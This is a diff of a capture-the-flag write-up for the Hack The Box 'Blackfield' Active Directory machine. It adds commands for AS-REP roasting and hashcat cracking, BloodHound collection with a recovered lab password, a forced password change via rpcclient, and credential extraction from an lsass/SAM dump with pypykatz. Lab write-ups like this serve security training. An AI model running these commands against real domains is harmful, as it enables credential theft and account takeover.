@@ -1,8 +1,14 @@
 # Blackfield
 
+## Key Take Aways
+
+* ASREP Roasting
+* Force change password
+* Lsass dump
+
 ## NMAP
 
-``` text
+``` console
 10.129.229.17:53
 10.129.229.17:88
 10.129.229.17:139
@@ -38,9 +44,9 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ![smb-shares](/HTB/Machines/images/Blackfield-smb-shares.png)
 
-we can get usernames via profles$ share and use it with ASREP Roasting
+We can get usernames via profles$ share and use it with ASREP Roasting.
 
-``` bash
+``` console
 mask ""
 recurse ON
 prompt OFF
@@ -49,10 +55,66 @@ lcd '~/path/to/download/to/'
 mget *
 ```
 
-```bash
+## ASREP Roasting
+
+```console
 impacket-GetNPUsers BLACKFIELD.local/ -usersfile user.txt -format hashcat -outputfile hashes.asreproast
 
 hashcat -m 18200 --force -a 0 hashes.asreproast /user/share/worldists/rockyou.txt
 ```
 
 ![GetNPUsers](/HTB/Machines/images/Blackfield-GetNPUsers.png)
+
+![dumphashes](./images/Blackfield-dump-hashes.png)
+
+![smb-svc](./images/Blackfield-SMB-svc.png)
+
+As mentioned above we still can't access the content of the forensic share.
+
+## BloodHound
+
+```console
+bloodhound-python -c all -u "support" -p "#00^BlackKnight" -d blackfield.local -dc dc01.blackfield.local -ns 10.129.229.17 --zip
+```
+
+![bloodhound](./images/Blackfield-bloodhound-py.png)
+
+![node-info](./images/blackfield-node-info.png)
+
+![forcechangepassword](./images/Blackfield-ForceChangePassword.png)
+
+## rpcclient
+
+As mentioned at [here](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword) rpcclient gets the job done easier.
+
+```console
+rpcclient -U blackfield.local/support dc01.blackfield.local
+```
+
+![rpcclient-changepwd](./images/Blackfield-rpcclient.png)
+
+## Access Foresic share
+
+```console
+nxc smb blackfield.local -u audit2020 -p 'Test!!!!' --shares
+```
+
+![smb-shares-audit](./images/Blackfield-audit-smb.png)
+
+![get-forensic](./images/Blackfield-audit-forensic.png)
+
+we can extract lsass.DMP from memory_analysis/lsass.zip
+
+![forensic](./images/Blackfield-forensic.png)
+
+## lsass dump
+
+```console
+pypykatz registry --sam sam system
+```
+
+[reference](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)
+
+![lsassdump](./images/Blackfield-lsass-dump.png)
+
+![user](./images/Blackfield-User.png)
